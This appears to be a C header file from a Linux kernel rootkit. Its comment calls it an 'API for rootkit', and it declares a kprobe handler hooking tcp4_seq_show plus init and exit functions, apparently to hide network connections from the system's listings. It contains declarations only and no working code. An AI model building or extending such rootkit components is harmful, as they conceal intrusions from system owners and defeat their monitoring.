#include <linux/kprobes.h>

#ifndef HIDENETWORK_H
#define HIDENETWORK_H

// Internals

int _handler_network_tcp4_seq_show(struct kprobe *p, struct pt_regs *regs);

// API for rootkit

int hidenetwork_init(void);
void hidenetwork_exit(void);

#endif